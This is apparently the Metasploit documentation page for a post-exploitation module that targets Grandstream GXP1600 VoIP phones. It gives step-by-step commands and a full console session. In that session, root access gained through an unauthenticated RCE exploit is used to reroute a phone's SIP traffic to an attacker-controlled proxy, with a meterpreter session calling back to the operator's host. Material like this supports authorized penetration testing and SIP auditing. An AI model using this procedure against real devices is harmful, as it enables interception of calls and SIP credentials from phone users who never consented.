## Vulnerable Application
This capture module works against Grandstream GXP1600 series VoIP devices and can reconfigure hte device to use an
arbitrary SIP proxy. You can first leverage the `exploit/linux/http/grandstream_gxp1600_unauth_rce` exploit
module to get a root session on a target GXP1600 series device before running this post module.

## Testing
This module was verified on a GXP1630 device running firmware version 1.0.7.78. A suitable SIP proxy must be running. An
example SIP proxy for testing and auditing SIP infrastructure is [here](https://github.com/sfewer-r7/sip-proxy).

## Verification Steps

1. Leverage the `exploit/linux/http/grandstream_gxp1600_unauth_rce` exploit module to get a root session on a
   target GXP1600 series device.
2. `use post/linux/capture/grandstream_gxp1600_sip`

Specify the target session to run this post module against:

3. `sessions -l`
4. `set SESSION <SESSION_ID>`

Specify the remote IP address and port of your SIP proxy:

5. `set SIP_PROXY_HOST 192.168.86.35`
6. `set SIP_PROXY_UDP_PORT 5060` (If different from the default `5060`).

List the configured SIP account and choose which one to proxy:
7. `list`
8. `set SIP_ACCOUNT_INDEX 0`

Sart and stop proxying SIP traffic:
9. `start`
10. `stop`

## Scenarios

### Example 1

NOTE: All account information below has been redacted via `*` characters.

```
msf exploit(linux/http/grandstream_gxp1600_unauth_rce) > sessions -l

Active sessions
===============

  Id  Name  Type                     Information                  Connection
  --  ----  ----                     -----------                  ----------
  1         meterpreter armle/linux  root @ gxp1630_c074ade84b53  192.168.86.122:4444 -> 192.168.86.77:59112 (192.168.86.77)

msf exploit(linux/http/grandstream_gxp1600_unauth_rce) > use linux/capture/grandstream_gxp1600_sip 
msf post(linux/capture/grandstream_gxp1600_sip) > set SESSION 1
SESSION => 1
msf post(linux/capture/grandstream_gxp1600_sip) > set SIP_PROXY_HOST 192.168.86.35
SIP_PROXY_HOST => 192.168.86.35
msf post(linux/capture/grandstream_gxp1600_sip) > show options 

Module options (post/linux/capture/grandstream_gxp1600_sip):

   Name                Current Setting  Required  Description
   ----                ---------------  --------  -----------
   SESSION             1                yes       The session to run this module on
   SIP_PROXY_HOST      192.168.86.35    yes       The remote SIP proxy host address
   SIP_PROXY_UDP_PORT  5060             yes       The remote SIP proxy UDP port


   When ACTION is one of start,stop:

   Name               Current Setting  Required  Description
   ----               ---------------  --------  -----------
   SIP_ACCOUNT_INDEX  0                no        The zero-based SIP Account index to operate on.


Post action:

   Name  Description
   ----  -----------
   list  List all SIP accounts.



View the full module info with the info, or info -d command.
msf post(linux/capture/grandstream_gxp1600_sip) > list
[*] Module running against phone model GXP1630
SIP Accounts
============

 Account Index  Account Enabled  Account Name  Display Name  User ID       Registrar Server            Registrar Server Transport  Outbound Proxy  Can Capture?
 -------------  ---------------  ------------  ------------  -------       ----------------            --------------------------  --------------  ------------
 0              Yes              ********                    **********    ***************:8060        udp                                         Yes
 1              No               *********                   ************  *********************:5060  udp                                         Yes
 2              No                                                                                     udp                                         No

[*] Post module execution completed
msf post(linux/capture/grandstream_gxp1600_sip) > set SIP_ACCOUNT_INDEX 0
SIP_ACCOUNT_INDEX => 0
msf post(linux/capture/grandstream_gxp1600_sip) > start
[*] Module running against phone model GXP1630
[*] Post module execution completed
msf post(linux/capture/grandstream_gxp1600_sip) > list
[*] Module running against phone model GXP1630
SIP Accounts
============

 Account Index  Account Enabled  Account Name  Display Name  User ID       Registrar Server            Registrar Server Transport  Outbound Proxy      Can Capture?
 -------------  ---------------  ------------  ------------  -------       ----------------            --------------------------  --------------      ------------
 0              Yes              ********                    **********    ***************:8060        udp                         192.168.86.35:5060  Yes
 1              No               *********                   ************  *********************:5060  udp                                             Yes
 2              No                                                                                     udp                                             No

[*] Post module execution completed
msf post(linux/capture/grandstream_gxp1600_sip) > stop
[*] Module running against phone model GXP1630
[*] Reading SIP account backup configuration: /tmp/10a334a378afafffb9d874b6907836d784df4cba
[*] Decrypting SIP account backup configuration.
[*] Reverting SIP account backup configuration
[*] Deleting SIP account backup configuration: /tmp/10a334a378afafffb9d874b6907836d784df4cba
[*] Post module execution completed
msf post(linux/capture/grandstream_gxp1600_sip) >
```